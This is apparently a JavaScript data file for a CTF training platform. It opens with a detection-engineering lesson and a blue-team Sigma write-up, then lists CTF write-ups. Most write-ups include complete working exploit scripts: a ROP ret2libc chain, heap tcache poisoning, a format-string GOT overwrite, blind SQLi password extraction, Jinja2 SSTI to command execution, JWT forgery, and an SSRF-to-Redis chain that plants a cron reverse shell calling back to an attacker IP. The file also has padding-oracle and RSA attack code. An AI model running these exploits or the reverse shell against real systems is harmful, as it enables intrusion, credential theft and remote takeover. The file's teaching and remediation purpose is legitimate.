    "theory": "Every offensive action produces an immutable telemetry artifact. In modern security operations, the objective of detection engineering is to translate low-level operating system and network observables into high-fidelity, resilient detection rules that detect adversarial behaviors regardless of tool modifications or payload obfuscation (following David Bianco's Pyramid of Pain).\n\nKernel Telemetry & Sensor Architecture:\n1. Linux Audit Framework (`auditd`): Operates in kernel space via netlink sockets. System administrators configure rules (`/etc/audit/rules.d/audit.rules`) to monitor sensitive file accesses (`-w /etc/shadow -p wa -k shadow_tamper`) and privileged system calls (`-a always,exit -F arch=b64 -S execve -F euid=0 -k root_exec`).\n2. YARA Rule Engine: The industry standard for pattern matching on binary files and process memory. YARA rules evaluate hexadecimal byte strings, ASCII/wide strings, regular expressions, and PE/ELF headers to identify malware families.\n3. Sigma Rules: An open, vendor-agnostic signature format for SIEM log events. Sigma rules describe suspicious log patterns (Windows Event Logs, Linux Syslog, CloudTrail) in standard YAML, which compiles into Splunk, Elasticsearch, or QRadar queries.\n4. MITRE ATT&CK Mapping: Categorizes adversary activity into Tactics (the adversary's technical goal, e.g. TA0006 Credential Access) and Techniques (the specific mechanism, e.g. T1003 OS Credential Dumping). Mapping findings to ATT&CK communicates risk and defensive posture across enterprise teams.",
    "commands": [
      {
        "cmd": "ausearch -k root_exec -i | tail -n 20",
        "why": "Searches Linux audit logs for executions flagged by the 'root_exec' rule and formats timestamps and UIDs into human-readable strings.",
        "when": "Investigating privilege escalation incidents on a Linux host.",
        "internals": "Parses `/var/log/audit/audit.log` searching for rule key tags.",
        "pitfalls": "Requires root privileges to read the audit log."
      },
      {
        "cmd": "yara -r -s ./rules.yar /suspicious_directory/",
        "why": "Recursively scans a directory using YARA rules and prints the matching rule name and matched string offsets.",
        "when": "Hunting for known web shells, Cobalt Strike beacons, or challenge artifacts.",
        "internals": "Compiles YARA rules into Aho-Corasick bytecode automata for high-speed string scanning.",
        "pitfalls": "Large files (> 100MB) may be skipped unless maximum file size parameters are increased."
      },
      {
        "cmd": "aureport --auth --failed",
        "why": "Generates a summary report of all failed authentication attempts across the operating system.",
        "when": "Triaging brute-force attacks or compromised accounts.",
        "internals": "Aggregates PAM and SSH login failure records from auditd.",
        "pitfalls": "Only captures events if PAM auditing is enabled in system configuration."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `ausearch -m SYSCALL -ts today | aureport -x --summary` generates complete execution audit in 1 second.",
      "gui_workflow": "Splunk / Kibana SIEM Dashboard: Visual timeline histograms, geo-ip maps, and threat intelligence correlation alerts.",
      "speed_tip": "In CTF forensics/blue-team challenges: run `grep -iE 'failed|invalid|unauthorized|denied' /var/log/auth.log` to immediately spot the attacker's entry point."
    },
    "triage_workflow": [
      "1. Scope the Incident: Determine timeframe, affected hosts, and initial indicators of compromise (IoCs).",
      "2. Review Audit Telemetry: Inspect `/var/log/auth.log`, `audit.log`, and `syslog` around the alert timestamp.",
      "3. Map Process Lineage: Identify parent process, spawned binaries, and command-line arguments.",
      "4. Scan Artifacts with YARA: Run signature scans across extracted memory dumps and suspicious binaries.",
      "5. ATT&CK Classification: Map observed behavior to ATT&CK tactics and techniques.",
      "6. Formulate Detection & Remediation: Write a Sigma rule or Auditd rule to detect future occurrences."
    ],
    "writeup": {
      "ctf_event": "SANS CyberCast / Blue Team Village",
      "challenge_name": "Triage-Master (Sigma Rule Construction)",
      "scenario": "A Linux workstation was compromised by an attacker who spawned an interactive bash shell via a SUID binary. Solvers must write a Sigma rule that detects the incident and extract the flag.",
      "solve_steps": [
        "1. Inspect audit logs: `ausearch -m SYSCALL`.",
        "2. Notice event: `type=EXECVE a0=\"/usr/local/bin/find\" a1=\".\" a2=\"-exec\" a3=\"/bin/sh\" a4=\"-p\"`.",
        "3. Notice effective UID is 0 (root) while original user ID is 1000 (ctf).",
        "4. Formulate detection logic: Process execution of `find` with `-exec` argument containing `/bin/sh` or `/bin/bash`.",
        "5. Author Sigma YAML rule: Selection on `Image: '*/find'` and `CommandLine: '*-exec*sh*'`. Submit to challenge verification engine.",
        "6. Challenge engine validates rule against testing dataset and awards flag.",
        "7. Flag: CTF{S1GM4_D3T3CT10N_ENG1N33R_2026}"
      ],
      "exploit_code": "# Sigma Rule: Detect GTFOBins SUID Find Execution\ntitle: SUID Find Shell Execution\nid: 4a2b9f12-2026-4c31-9a11-8f2a4e9b7d12\nstatus: experimental\ndescription: Detects execution of find with -exec spawning a privileged shell\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/find'\n        CommandLine|contains:\n            - '-exec'\n            - 'sh'\n    condition: selection\nlevel: high\ntags:\n    - attack.privilege_escalation\n    - attack.t1548.001",
      "flag": "CTF{S1GM4_D3T3CT10N_ENG1N33R_2026}",
      "mitigation": "Enforce strict audit rules on all SUID executables, alert immediately when an unprivileged process executes an SUID binary that spawns a shell, and employ AppArmor/SELinux mandatory access controls."
    }
  }
};

window.TOURNAMENT_WRITEUPS = [
  {
    "id": "writeup-defcon-babyrop",
    "title": "DEF CON CTF: BabyROP (ret2libc & ASLR Bypass)",
    "event": "DEF CON CTF Qualifier",
    "category": "pwn",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "CTF{r3t2l1bc_d3fc0n_b4by_r0p_pwn3d}",
    "scenario": "A 64-bit ELF binary listening on TCP port 9001. The binary reads user input into a fixed-size buffer using the insecure gets() function. Mitigations: NX Enabled, Partial RELRO, No Stack Canary, ASLR Enabled, No PIE.",
    "root_cause": "The binary calls gets(&buf) where buf is a 64-byte stack allocation. gets() performs no bounds checking, allowing arbitrary overwrite of the saved RBP and saved RIP at offset 72. Although NX prevents shellcode execution on the stack, the absence of PIE places binary code and PLT/GOT stubs at deterministic virtual addresses (0x400000). A two-stage ROP chain leaks libc via puts(puts@GOT) and executes system('/bin/sh').",
    "solve_methodology": [
      "Triage binary protections using checksec: Partial RELRO, No Canary, NX Enabled, No PIE.",
      "Determine exact RIP offset using GEF 'pattern create 120' -> crash at offset 72.",
      "Harvest ROP gadgets using ROPgadget: 'pop rdi; ret' at 0x4011d3, 'ret' at 0x40101a (for 16-byte SSE stack alignment).",
      "Stage 1 ROP: Call puts(puts@got), then loop back to main (0x401146) to preserve execution context.",
      "Parse 8-byte leaked libc address, compute libc_base = leak - libc.symbols['puts'].",
      "Calculate runtime addresses: system = libc_base + libc.symbols['system'], binsh = libc_base + next(libc.search(b'/bin/sh')).",
      "Stage 2 ROP: [ret (alignment)] + [pop rdi; ret] + [binsh] + [system].",
      "Send Stage 2 payload to gain root shell and execute 'cat /flag'."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom pwn import *\n\n# Context & Binaries\ncontext.arch = 'amd64'\nelf = ELF('./babyrop')\nlibc = ELF('./libc.so.6')\n\n# Target connection\n# io = process('./babyrop')\nio = remote('targets.ctfatlas.local', 9001)\n\n# Gadgets (No PIE)\npop_rdi = 0x4011d3  # pop rdi; ret\nret = 0x40101a      # ret (SSE 16-byte alignment)\nmain = 0x401146\n\n# Stage 1: Leak Libc via puts@plt(puts@got)\npayload1 = b'A' * 72\npayload1 += p64(pop_rdi)\npayload1 += p64(elf.got['puts'])\npayload1 += p64(elf.plt['puts'])\npayload1 += p64(main)\n\nio.sendlineafter(b'Enter payload: ', payload1)\nraw_leak = io.recvline().strip()\nleak = u64(raw_leak.ljust(8, b'\\x00'))\nlibc.address = leak - libc.symbols['puts']\nlog.success(f'Leaked Libc Base: {hex(libc.address)}')\n\n# Stage 2: ret2libc system('/bin/sh')\nbinsh = next(libc.search(b'/bin/sh\\x00'))\nsystem = libc.symbols['system']\n\npayload2 = b'A' * 72\npayload2 += p64(ret)  # Alignment fix for movaps in system()\npayload2 += p64(pop_rdi)\npayload2 += p64(binsh)\npayload2 += p64(system)\n\nio.sendlineafter(b'Enter payload: ', payload2)\nio.sendline(b'cat /flag')\nio.interactive()\n",
    "defense_remediation": "1. Replace gets() with fgets(buf, sizeof(buf), stdin) to enforce strict buffer boundaries.\n2. Compile with full mitigations: -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now."
  },
  {
    "id": "writeup-hitcon-tcache",
    "title": "HITCON CTF: Secret Note (Tcache Poisoning & UAF)",
    "event": "HITCON CTF",
    "category": "pwn",
    "difficulty": "Hard",
    "points": 500,
    "flag": "CTF{tc4ch3_p01s0n1ng_fr33_h00k_rce}",
    "scenario": "A Linux heap challenge compiled with Glibc 2.27. Users can allocate (malloc), edit, view, and free notes. Mitigations: Full RELRO, Canary Found, NX Enabled, PIE Enabled, ASLR Enabled.",
    "root_cause": "In the delete_note() function, the pointer in the global notes array is not zeroed out after free(ptr), resulting in a Use-After-Free (UAF). In Glibc 2.27, tcache bins do not enforce double-free checks or safe linking (pointer mangling). Freeing a chunk twice creates a cycle in the tcache singly linked list. Modifying the fd pointer of the freed chunk directs subsequent malloc calls to an arbitrary target address (__free_hook).",
    "solve_methodology": [
      "Allocate a large chunk (> tcache max 0x410, e.g., 0x500) and free it to place it in the unsorted bin.",
      "Read the chunk content via UAF to leak main_arena + 96, calculating the libc base address.",
      "Allocate two 0x70 chunks: note_A and note_B.",
      "Free note_A, then free note_A again (or free note_A, free note_B, free note_A) to corrupt tcache bin 0x70.",
      "Edit note_A's fd pointer to point to libc.symbols['__free_hook'].",
      "Call malloc(0x70) twice: first returns note_A, second returns chunk at __free_hook.",
      "Write the address of one_gadget or system() into __free_hook.",
      "Allocate a chunk containing '/bin/sh\\x00' and free it, triggering __free_hook('/bin/sh') -> spawns shell."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\nelf = ELF('./secret_note')\nlibc = ELF('./libc.so.6')\n# io = process('./secret_note')\nio = remote('targets.ctfatlas.local', 9002)\n\ndef add(idx, size, content):\n    io.sendlineafter(b'> ', b'1')\n    io.sendlineafter(b'Index: ', str(idx).encode())\n    io.sendlineafter(b'Size: ', str(size).encode())\n    io.sendafter(b'Content: ', content)\n\ndef delete(idx):\n    io.sendlineafter(b'> ', b'2')\n    io.sendlineafter(b'Index: ', str(idx).encode())\n\ndef view(idx):\n    io.sendlineafter(b'> ', b'3')\n    io.sendlineafter(b'Index: ', str(idx).encode())\n    return io.recvline().strip()\n\n# 1. Unsorted bin leak\nadd(0, 0x500, b'A'*8)  # Chunk larger than tcache\nadd(1, 0x20, b'/bin/sh\\x00') # Guard chunk preventing top chunk consolidation\ndelete(0)             # Goes to unsorted bin; fd/bk point to main_arena+96\n\nleak = u64(view(0)[:8].ljust(8, b'\\x00'))\nlibc.address = leak - 0x3ebca0  # main_arena + 96 offset for glibc 2.27\nlog.success(f'Libc Base: {hex(libc.address)}')\n\n# 2. Tcache poisoning (0x60 chunk size)\nadd(2, 0x60, b'B'*8)\ndelete(2)\ndelete(2)  # Double-free into tcache in glibc 2.27!\n\n# 3. Overwrite fd to __free_hook\nfree_hook = libc.symbols['__free_hook']\nsystem = libc.symbols['system']\nadd(3, 0x60, p64(free_hook))\nadd(4, 0x60, b'dummy')\nadd(5, 0x60, p64(system))  # Allocated directly at __free_hook!\n\n# 4. Trigger free('/bin/sh')\ndelete(1)  # Index 1 holds '/bin/sh\\x00' -> calls system('/bin/sh')\nio.interactive()\n",
    "defense_remediation": "1. Set pointers to NULL immediately after freeing (ptr = NULL) to eliminate UAF and double-free primitives.\n2. Upgrade to modern Glibc (>= 2.32) which includes safe linking (pointer obfuscation) and tcache double-free counters."
  },
  {
    "id": "writeup-plaid-fmtstr",
    "title": "PlaidCTF: Echo Echo (Arbitrary Memory Read/Write via %n)",
    "event": "PlaidCTF",
    "category": "pwn",
    "difficulty": "Hard",
    "points": 450,
    "flag": "CTF{fmt_str1ng_g0t_0v3rwr1t3_l34k}",
    "scenario": "A network daemon echoes client input using printf(user_buffer). Mitigations: Partial RELRO, No Canary, NX Enabled, No PIE.",
    "root_cause": "Passing an unsanitized user-controlled string as the first argument to printf() creates a format string vulnerability. An attacker can use '%x' or '%p' with direct parameter access ('%$') to read arbitrary stack and memory values, and '%hn' / '%hhn' to write arbitrary values to arbitrary addresses.",
    "solve_methodology": [
      "Find format argument index: send 'AAAA-%p-%p-%p...' to see where '41414141' appears (offset 6).",
      "Leak libc base address: inspect stack pointers at higher offsets (e.g., %19$p points into __libc_start_main + 231).",
      "Calculate target write: overwrite exit@GOT or puts@GOT with the address of system().",
      "Construct staged two-byte writes (%hn) to puts@GOT using pwntools fmtstr_payload.",
      "Send payload triggering puts('/bin/sh') -> spawns shell."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\nelf = ELF('./echo_server')\nlibc = ELF('./libc.so.6')\n# io = process('./echo_server')\nio = remote('targets.ctfatlas.local', 9003)\n\n# 1. Leak libc via format string\nio.sendline(b'%19$p')\nleak = int(io.recvline().strip(), 16)\nlibc.address = leak - (libc.symbols['__libc_start_main'] + 231)\nlog.success(f'Libc Base: {hex(libc.address)}')\n\n# 2. Build format string payload to overwrite puts@got with system()\n# Offset 6 corresponds to the start of our input buffer\nwrites = {elf.got['puts']: libc.symbols['system']}\npayload = fmtstr_payload(6, writes, write_size='short')\n\nio.sendline(payload)\nio.recvline() # Consume printf output\n\n# 3. Next call to puts(str) executes system(str)\nio.sendline(b'/bin/sh\\x00')\nio.interactive()\n",
    "defense_remediation": "Never pass user input directly as the format string. Always use static format specifiers: printf(\"%s\", user_input)."
  },
  {
    "id": "writeup-portswigger-sqli",
    "title": "PortSwigger / Real-World CTF: High-Speed Blind Time-Based SQLi",
    "event": "Real-World CTF",
    "category": "web",
    "difficulty": "Medium-Hard",
    "points": 300,
    "flag": "CTF{bl1nd_t1m3_sqli_b1n4ry_s34rch}",
    "scenario": "An e-commerce tracking cookie ('TrackingId') is passed directly into a backend PostgreSQL query without parameterization. No error messages or query outputs are returned in the HTTP response.",
    "root_cause": "The TrackingId cookie is vulnerable to blind SQL injection. By injecting conditional delay statements (pg_sleep(2) on PostgreSQL or SLEEP(2) on MySQL), an attacker can extract data bit-by-bit using binary search.",
    "solve_methodology": [
      "Confirm timing injection: ' || pg_sleep(3)-- causes a 3-second delay, whereas ' || pg_sleep(0)-- returns immediately.",
      "Determine password length by querying: ' || (SELECT CASE WHEN (LENGTH(password)=32) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--",
      "Perform binary search on each character position: ' || (SELECT CASE WHEN (ASCII(SUBSTRING(password,{pos},1)) > {mid}) THEN pg_sleep(1.5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--",
      "Extract complete 32-character admin password in under 2 minutes (approx 7 HTTP requests per character instead of 256)."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport time\n\nURL = 'https://challenge.ctfatlas.local/filter?category=Gifts'\nCHARS = 'abcdefghijklmnopqrstuvwxyz0123456789'\n\ndef test_condition(payload_condition):\n    cookie_val = f\"x' || (SELECT CASE WHEN ({payload_condition}) THEN pg_sleep(1.5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--\"\n    cookies = {'TrackingId': cookie_val, 'session': 'somesession'}\n    start = time.time()\n    try:\n        requests.get(URL, cookies=cookies, timeout=5)\n    except requests.exceptions.Timeout:\n        return True\n    return (time.time() - start) >= 1.4\n\ndef extract_password():\n    extracted = ''\n    for pos in range(1, 33):\n        low = 32\n        high = 126\n        while low <= high:\n            mid = (low + high) // 2\n            if test_condition(f\"ASCII(SUBSTRING(password,{pos},1)) > {mid}\"):\n                low = mid + 1\n            else:\n                high = mid - 1\n        extracted += chr(low)\n        print(f'[+] Position {pos}: {chr(low)} -> Current: {extracted}')\n    return extracted\n\nif __name__ == '__main__':\n    print('Starting high-speed binary search blind SQLi...')\n    pwd = extract_password()\n    print(f'Final Password: {pwd}')\n",
    "defense_remediation": "Always use parameterized prepared statements (e.g., db.query('SELECT * FROM tracking WHERE id = $1', [tracking_id])). Never concatenate raw user strings into SQL queries."
  },
  {
    "id": "writeup-htb-ssti",
    "title": "HackTheBox / CTF: Jinja2 Template Injection to RCE",
    "event": "HackTheBox University CTF",
    "category": "web",
    "difficulty": "Medium",
    "points": 300,
    "flag": "CTF{j1nj42_mro_subpr0c3ss_p0p3n_rc3}",
    "scenario": "A Flask web application renders custom user error messages with render_template_string(f'Error: {user_input}'). A WAF filters strings containing 'config', 'os', 'system', 'class', and double quotes.",
    "root_cause": "Direct interpolation of user input into Jinja2 templates enables Server-Side Template Injection (SSTI). An attacker traverses Python's Method Resolution Order (MRO) via ('').__class__.__mro__[1].__subclasses__() to locate subprocess.Popen and execute arbitrary system commands, bypassing keyword filters via string concatenation or request.args.",
    "solve_methodology": [
      "Test injection: {{ 7 * 7 }} returns 'Error: 49', confirming SSTI.",
      "Bypass quote and keyword filters using request.args: {{ ().__class__.__bases__[0].__subclasses__() }}.",
      "Iterate through subclasses to find index of subprocess.Popen (typically around index 200\u2013500 depending on imports).",
      "Construct clean one-liner: {{ ().__class__.__bases__[0].__subclasses__()[415](request.args.cmd,shell=True,stdout=-1).communicate()[0] }}&cmd=cat+/flag.txt.",
      "Execute and read the flag from HTTP response body."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport urllib.parse\n\nURL = 'https://challenge.ctfatlas.local/render'\n\n# 1. Payload to locate subprocess.Popen without using quotes or blocked keywords\npayload = \"\"\"{{\n[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0](request.args.cmd,shell=True,stdout=-1).communicate()[0].decode()\n}}\"\"\"\n\nparams = {\n    'name': payload,\n    'cmd': 'cat /flag.txt'\n}\n\nres = requests.get(URL, params=params)\nprint('[+] Response Output:')\nprint(res.text)\n",
    "defense_remediation": "Never use render_template_string with dynamic user strings. Pass variables to render_template() as template context parameters (e.g., render_template('error.html', error=user_input))."
  },
  {
    "id": "writeup-defcon-jwt",
    "title": "DEF CON CTF: JWT Algorithm Confusion (RS256 -> HS256)",
    "event": "DEF CON CTF",
    "category": "web",
    "difficulty": "Hard",
    "points": 400,
    "flag": "CTF{jwt_4lg_c0nfus10n_rs256_t0_hs256}",
    "scenario": "An enterprise API validates session JWTs. The public RSA key used to verify signatures is publicly accessible at /public.pem. The backend JWT library dynamically respects the 'alg' header specified in the incoming token.",
    "root_cause": "The verification backend accepts tokens signed with HMAC-SHA256 ('alg': 'HS256') using the RSA public key string as the symmetric HMAC secret. An attacker signs an forged admin token using HMAC-SHA256 with the target's public PEM key as the secret key.",
    "solve_methodology": [
      "Fetch the server's public key from /public.pem.",
      "Ensure the PEM format exactly matches the bytes used by the server (including newlines and header/footer).",
      "Craft a JWT header with {\"alg\": \"HS256\", \"typ\": \"JWT\"}.",
      "Craft a payload with {\"user\": \"admin\", \"role\": \"superuser\", \"exp\": 1999999999}.",
      "Sign the token using HMAC-SHA256 with the public key as the secret.",
      "Submit the forged token in the Authorization: Bearer header to access privileged endpoints."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport hmac\nimport hashlib\nimport base64\nimport json\nimport requests\n\n# 1. Fetch public key\npubkey_pem = requests.get('https://api.ctfatlas.local/public.pem').text.encode('utf-8')\n\n# 2. Craft Header and Payload\nheader = {\"alg\": \"HS256\", \"typ\": \"JWT\"}\npayload = {\"sub\": \"admin\", \"role\": \"administrator\", \"exp\": 2000000000}\n\ndef b64url(data):\n    if isinstance(data, dict):\n        data = json.dumps(data, separators=(',', ':')).encode('utf-8')\n    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')\n\nh_b64 = b64url(header)\np_b64 = b64url(payload)\nunsigned_token = f'{h_b64}.{p_b64}'\n\n# 3. Sign using HMAC-SHA256 with public key bytes as secret\nsig = hmac.new(pubkey_pem, unsigned_token.encode('utf-8'), hashlib.sha256).digest()\nsig_b64 = base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')\n\nforged_token = f'{unsigned_token}.{sig_b64}'\nprint(f'[+] Forged Token: {forged_token}')\n\n# 4. Access admin endpoint\nheaders = {'Authorization': f'Bearer {forged_token}'}\nres = requests.get('https://api.ctfatlas.local/admin/flag', headers=headers)\nprint(res.text)\n",
    "defense_remediation": "Strictly enforce expected algorithms in JWT verification libraries: jwt.verify(token, pubkey, algorithms=['RS256']). Never allow the token's header to determine the verification algorithm."
  },
  {
    "id": "writeup-google-ssrf-gopher",
    "title": "Google CTF: SSRF to Internal Redis RCE via Gopher",
    "event": "Google CTF",
    "category": "web",
    "difficulty": "Hard",
    "points": 500,
    "flag": "CTF{ssrf_g0ph3r_r3d1s_cr0nt4b_rc3}",
    "scenario": "A webhook test service fetches user-supplied URLs. An internal Redis instance is running unauthenticated on 127.0.0.1:6379. A regex filter blocks URLs starting with 'http://127.', 'http://localhost', or 'http://0.0.0.0'.",
    "root_cause": "The URL validator fails to block alternative IP notations (such as decimal IP 2130706433 or IPv6 [::1]) and permits arbitrary URL schemes, specifically 'gopher://'. The gopher protocol allows sending raw bytes (including newlines) to any TCP port, enabling arbitrary command execution against unauthenticated internal services like Redis.",
    "solve_methodology": [
      "Bypass IP filter: 127.0.0.1 can be represented as decimal 2130706433 or 127.1 or 0x7f000001.",
      "Construct Redis RESP command sequence to write a reverse shell into /etc/cron.d/evil_cron.",
      "Redis commands: flushall, set 1 '\\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.ip/4444 0>&1\"\\n', config set dir /etc/cron.d, config set dbfilename evil_cron, save.",
      "Encode command string using Gopher URL percent-encoding (%0d%0a for CRLF).",
      "Send SSRF request: gopher://2130706433:6379/_*3%0d%0a$3%0d%0aset...",
      "Receive root reverse shell on attacker listener."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport urllib.parse\nimport requests\n\nATTACKER_IP = '198.51.100.5'\nATTACKER_PORT = 4444\n\ncron_payload = f'\\n\\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\"\\n\\n'\n\nredis_commands = [\n    'FLUSHALL',\n    f'SET 1 {cron_payload}',\n    'CONFIG SET dir /etc/cron.d',\n    'CONFIG SET dbfilename pwn',\n    'SAVE',\n    'QUIT'\n]\n\npayload = ''\nfor cmd in redis_commands:\n    payload += cmd + '\\r\\n'\n\n# URL encode twice for gopher injection\nencoded_gopher = urllib.parse.quote(payload)\n# Decimal IP for 127.0.0.1 is 2130706433\nssrf_target = f'gopher://2130706433:6379/_{encoded_gopher}'\n\nprint(f'[+] Sending SSRF Gopher Payload: {ssrf_target[:60]}...')\nres = requests.post('https://webhook.ctfatlas.local/fetch', data={'url': ssrf_target})\nprint(f'[+] Response: {res.status_code}')\n",
    "defense_remediation": "1. Enforce strict URL protocol whitelisting (http:// and https:// only; disallow gopher://, file://, dict://).\n2. Resolve the domain to its IP address and verify that the destination IP does not belong to private/loopback CIDRs (RFC 1918/RFC 5735).\n3. Require password authentication on Redis (requirepass) and disable dangerous commands (CONFIG, SAVE, FLUSHALL)."
  },
  {
    "id": "writeup-cryptohack-wiener",
    "title": "CryptoHack: Wiener's Attack on Small Private Exponent RSA",
    "event": "CryptoHack Competition",
    "category": "crypto",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "CTF{w13n3r_c0nt1nu3d_fr4ct10ns_d_r3c0v3r3d}",
    "scenario": "A 2048-bit RSA public key (n, e) is provided along with ciphertext c. The public exponent e is exceptionally large (approximately the same bit length as n, e \u2248 n), which suggests that a very small private exponent d was selected to speed up decryption.",
    "root_cause": "When d < (1/3) * n^(1/4), Wiener's Theorem states that the fraction k/d appears as one of the convergents of the continued fraction expansion of e/n. Calculating the convergents of e/n yields candidates for (k, d), from which Euler's totient phi(n) = (e*d - 1)/k can be computed and the quadratic equation x^2 - (n - phi + 1)x + n = 0 solved for p and q.",
    "solve_methodology": [
      "Compute the continued fraction expansion coefficients [a0, a1, a2, ...] of e/n.",
      "Generate the sequence of convergents h_i / k_i.",
      "For each convergent k_i, test if d = k_i produces valid integer factors of n.",
      "Once p and q are recovered, verify p * q == n, compute d = inverse(e, (p-1)*(q-1)), and decrypt m = pow(c, d, n)."
    ],
    "exploit_script": "#!/usr/bin/env python3\nfrom Crypto.Util.number import long_to_bytes\nimport gmpy2\n\ndef continued_fractions(num, den):\n    while den:\n        q = num // den\n        yield q\n        num, den = den, num - q * den\n\ndef convergents(cf_gen):\n    h_prev, h_curr = 0, 1\n    k_prev, k_curr = 1, 0\n    for q in cf_gen:\n        h_next = q * h_curr + h_prev\n        k_next = q * k_curr + k_prev\n        yield h_next, k_next\n        h_prev, h_curr = h_curr, h_next\n        k_prev, k_curr = k_curr, k_next\n\ndef wiener_attack(e, n):\n    cf = continued_fractions(e, n)\n    for k, d in convergents(cf):\n        if k == 0:\n            continue\n        if (e * d - 1) % k != 0:\n            continue\n        phi = (e * d - 1) // k\n        # Solve x^2 - (n - phi + 1)x + n = 0\n        b = n - phi + 1\n        discr = b * b - 4 * n\n        if discr >= 0 and gmpy2.is_square(discr):\n            root = gmpy2.isqrt(discr)\n            p = (b + root) // 2\n            q = (b - root) // 2\n            if p * q == n:\n                return int(d), int(p), int(q)\n    return None\n\n# Example parameters from challenge\nn = 0xd88a... # 2048-bit\ne = 0xc71b...\nc = 0x5a2f...\n# d, p, q = wiener_attack(e, n)\n# print(long_to_bytes(pow(c, d, n)).decode())\n",
    "defense_remediation": "Always choose standard public exponents (e = 65537) and generate private exponents d of comparable bit length to n (d > 2^(n_bits/2))."
  },
  {
    "id": "writeup-defcon-padding-oracle",
    "title": "DEF CON CTF: AES-CBC Padding Oracle Decryption",
    "event": "DEF CON CTF",
    "category": "crypto",
    "difficulty": "Hard",
    "points": 450,
    "flag": "CTF{p4dd1ng_0r4cl3_c0mpl3t3_d3crypt10n}",
    "scenario": "A web application decrypts user authentication tokens encrypted with AES-CBC. When invalid PKCS#7 padding is encountered, the server returns HTTP 500 'Padding Error'. When valid padding is present (even if content is garbage), it returns HTTP 200 or 401.",
    "root_cause": "Differentiating between padding errors and authentication errors creates a Padding Oracle. By manipulating the ciphertext bytes of block C_{i-1}, an attacker can determine the intermediate state bytes I_i = AES_Decrypt(C_i) one byte at a time from right to left, recovering plaintext P_i = I_i ^ C_{i-1} without knowing the encryption key.",
    "solve_methodology": [
      "Split ciphertext into 16-byte blocks C_0 (IV), C_1, C_2, ...",
      "To decrypt byte 16 of block C_1, modify byte 16 of C_0: send all 256 candidate bytes until the oracle returns 200/401 (valid padding 0x01).",
      "Calculate intermediate byte: I[15] = guess ^ 0x01.",
      "Plaintext byte is P[15] = I[15] ^ original_C0[15].",
      "Set manipulated C_0 bytes 16..k to produce padding (16-k+1), then solve for byte k-1.",
      "Repeat across all ciphertext blocks to recover the full plaintext."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\n\nBLOCK_SIZE = 16\nURL = 'https://auth.ctfatlas.local/verify'\n\ndef padding_oracle(cipher_bytes):\n    res = requests.post(URL, data={'token': cipher_bytes.hex()})\n    # True if valid padding, False if padding error\n    return 'Padding Error' not in res.text\n\ndef decrypt_block(c_prev, c_curr):\n    intermediate = bytearray(BLOCK_SIZE)\n    plaintext = bytearray(BLOCK_SIZE)\n    \n    for byte_idx in reversed(range(BLOCK_SIZE)):\n        pad_val = BLOCK_SIZE - byte_idx\n        test_c_prev = bytearray(c_prev)\n        \n        # Set previously solved bytes to target padding value\n        for k in range(byte_idx + 1, BLOCK_SIZE):\n            test_c_prev[k] = intermediate[k] ^ pad_val\n            \n        found = False\n        for guess in range(256):\n            test_c_prev[byte_idx] = guess\n            if padding_oracle(test_c_prev + c_curr):\n                intermediate[byte_idx] = guess ^ pad_val\n                plaintext[byte_idx] = intermediate[byte_idx] ^ c_prev[byte_idx]\n                found = True\n                break\n        if not found:\n            print(f'[-] Failed to solve byte {byte_idx}')\n    return bytes(plaintext)\n\n# Run over all blocks...\n",
    "defense_remediation": "1. Migrate to authenticated encryption modes such as AES-GCM or ChaCha20-Poly1305 (AEAD).\n2. If using CBC, always apply Encrypt-then-MAC (HMAC-SHA256 over ciphertext + IV) and verify HMAC in constant time before decrypting."
  },
  {
    "id": "writeup-google-ecdsa-nonce",
    "title": "Google CTF: ECDSA Nonce Reuse Private Key Recovery",
    "event": "Google CTF",
    "category": "crypto",
    "difficulty": "Hard",
    "points": 500,
    "flag": "CTF{3cdsa_n0nc3_r3us3_k3y_r3c0v3ry}",
    "scenario": "A cryptographic signing server provides digital signatures using the secp256k1 curve. Two distinct messages (m1 and m2) have been signed, resulting in signatures (r1, s1) and (r2, s2). Crucially, r1 == r2.",
    "root_cause": "In ECDSA, the parameter r is calculated as r = (k * G).x mod n, where k is the per-signature ephemeral nonce. If the same nonce k is reused across two distinct messages, r1 == r2. This allows calculating k directly: k = (h1 - h2) / (s1 - s2) mod n. Once k is known, the private key d is recovered via d = (s1 * k - h1) / r mod n.",
    "solve_methodology": [
      "Verify that r1 == r2, confirming nonce reuse.",
      "Compute message hashes: h1 = SHA256(m1) as integer, h2 = SHA256(m2) as integer.",
      "Compute k = ((h1 - h2) * inverse(s1 - s2, n)) mod n.",
      "Compute private key d = ((s1 * k - h1) * inverse(r1, n)) mod n.",
      "Derive the public key from d * G and verify it matches the challenge public key.",
      "Use d to sign the challenge flag request string 'GET_FLAG_AUTHORIZED'."
    ],
